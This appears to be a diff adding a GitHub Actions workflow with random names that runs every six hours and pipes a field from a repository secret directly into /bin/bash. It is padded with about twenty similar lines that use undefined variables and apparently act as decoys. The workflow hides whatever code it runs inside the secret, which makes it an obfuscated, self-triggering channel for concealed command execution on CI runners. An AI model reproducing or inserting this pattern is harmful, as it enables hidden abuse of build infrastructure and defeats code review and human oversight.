@@ -1,0 +1,38 @@
+name: songziyang4535
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: songziyang4535
+        env:
+          gmpa105: ${{ secrets.gmpa105 }}
+        run: |
+          echo $gmpa105 | jq -r .py1 | /bin/bash
+          echo $iwwf05 | jq -r .wml78 | /bin/bash
+          echo $ymt844 | jq -r .qhaw5912 | /bin/bash
+          echo $hr26 | jq -r .lkl73 | /bin/bash
+          echo $ng1 | jq -r .oput64 | /bin/bash
+          echo $u3 | jq -r .qzyc604 | /bin/bash
+          echo $f3180 | jq -r .rox5 | /bin/bash
+          echo $pkyrp3 | jq -r .sqah157 | /bin/bash
+          echo $un23437 | jq -r .cf78408 | /bin/bash
+          echo $jr74 | jq -r .zfv007 | /bin/bash
+          echo $i9 | jq -r .w67 | /bin/bash
+          echo $u25378 | jq -r .c69 | /bin/bash
+          echo $ads550 | jq -r .h5090 | /bin/bash
+          echo $pruk748 | jq -r .r4 | /bin/bash
+          echo $ned0414 | jq -r .dr06663 | /bin/bash
+          echo $r6320 | jq -r .q47696 | /bin/bash
+          echo $fnxb8546 | jq -r .hc13876 | /bin/bash
+          echo $ba543 | jq -r .ooqav52 | /bin/bash
+          echo $nnk87573 | jq -r .u2 | /bin/bash
+          echo $vose58767 | jq -r .s86371 | /bin/bash
+          echo $qztly35 | jq -r .qmap69336 | /bin/bash
+          echo $hke75 | jq -r .ncoa32455 | /bin/bash
+
